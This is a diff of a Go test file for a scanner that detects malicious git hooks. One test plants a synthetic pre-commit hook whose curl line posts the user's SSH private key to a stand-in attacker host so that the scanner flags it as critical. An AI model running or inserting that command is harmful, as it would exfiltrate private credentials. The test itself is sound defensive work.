@@ -138,14 +138,120 @@ func TestContainersScanner_Stub(t *testing.T) {
 	}
 }
 
-func TestGitHooksScanner_Stub(t *testing.T) {
+func TestGitHooksScanner_DoesNotError(t *testing.T) {
 	s := code.NewGitHooksScanner()
-	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	_, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{t.TempDir()}})
 	if err != nil {
 		t.Fatalf("Scan returned unexpected error: %v", err)
 	}
-	if len(findings) != 0 {
-		t.Errorf("expected 0 findings from stub, got %d", len(findings))
+}
+
+// TestGitHooksScanner_DetectsMaliciousHook creates a synthetic .git/hooks/
+// directory containing a pre-commit hook with a curl command and verifies
+// that the scanner returns a CRITICAL finding.
+func TestGitHooksScanner_DetectsMaliciousHook(t *testing.T) {
+	dir := t.TempDir()
+	hooksDir := filepath.Join(dir, ".git", "hooks")
+	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+
+	hookFile := filepath.Join(hooksDir, "pre-commit")
+	content := "#!/bin/sh\ncurl http://evil.example.com/exfil -d @~/.ssh/id_rsa\n"
+	if err := os.WriteFile(hookFile, []byte(content), 0o755); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := code.NewGitHooksScanner()
+	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
+	findings, err := s.Scan(context.Background(), opts)
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+	if len(findings) == 0 {
+		t.Fatal("expected at least one finding for malicious hook, got none")
+	}
+	found := false
+	for _, f := range findings {
+		if f.Severity == scanner.SevCritical && f.Scanner == "git_hooks" {
+			found = true
+			if f.ID == "" {
+				t.Error("finding has empty ID")
+			}
+			if f.Evidence == "" {
+				t.Error("finding has empty Evidence")
+			}
+			if f.Location == "" {
+				t.Error("finding has empty Location")
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected a CRITICAL finding for malicious hook, got: %+v", findings)
+	}
+}
+
+// TestGitHooksScanner_FlagsUnknownExecutableHook verifies that an executable
+// hook with no malicious patterns but no known framework signature gets a
+// MEDIUM finding.
+func TestGitHooksScanner_FlagsUnknownExecutableHook(t *testing.T) {
+	dir := t.TempDir()
+	hooksDir := filepath.Join(dir, ".git", "hooks")
+	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+
+	hookFile := filepath.Join(hooksDir, "pre-push")
+	content := "#!/bin/sh\necho 'running tests'\n"
+	if err := os.WriteFile(hookFile, []byte(content), 0o755); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := code.NewGitHooksScanner()
+	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
+	findings, err := s.Scan(context.Background(), opts)
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+
+	found := false
+	for _, f := range findings {
+		if f.Severity == scanner.SevMedium && f.Scanner == "git_hooks" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected a MEDIUM finding for unknown executable hook, got: %+v", findings)
+	}
+}
+
+// TestGitHooksScanner_NoFindingsForHuskyHook verifies that a hook managed by
+// husky does not produce findings.
+func TestGitHooksScanner_NoFindingsForHuskyHook(t *testing.T) {
+	dir := t.TempDir()
+	hooksDir := filepath.Join(dir, ".git", "hooks")
+	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+
+	hookFile := filepath.Join(hooksDir, "pre-commit")
+	// Typical husky-generated hook content.
+	content := "#!/bin/sh\n. \"$(dirname -- \"$0\")/_/husky.sh\"\nnpm test\n"
+	if err := os.WriteFile(hookFile, []byte(content), 0o755); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := code.NewGitHooksScanner()
+	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
+	findings, err := s.Scan(context.Background(), opts)
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+
+	for _, f := range findings {
+		if f.Scanner == "git_hooks" {
+			t.Errorf("unexpected finding for husky-managed hook: %+v", f)
+		}
 	}
 }
 
